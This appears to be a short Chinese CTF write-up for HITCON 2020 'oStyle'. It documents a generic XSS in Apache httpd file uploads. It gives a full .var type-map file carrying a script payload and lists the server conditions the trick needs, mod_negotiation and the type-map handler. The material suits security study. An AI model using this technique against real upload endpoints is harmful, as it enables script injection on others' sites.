# HITCON-2020-web-oStyle

* apache-httpd文件上传通用XSS

* 测试环境Ubuntu20.04-apache v2.4.41

测试所用的test.var文件

```
Content-type: text/html
Body:----foo----
<script>
alert(document.domain)
</script>
----foo----
```

## 成功执行条件

1. 存在mod_negotiation模块

2. 开启AddHandler type-map var

* Ubuntu环境满足1和2，Alpine Linux只满足1(不会执行)

注：Ubuntu相关配置文件位于mod_enabled/mime.conf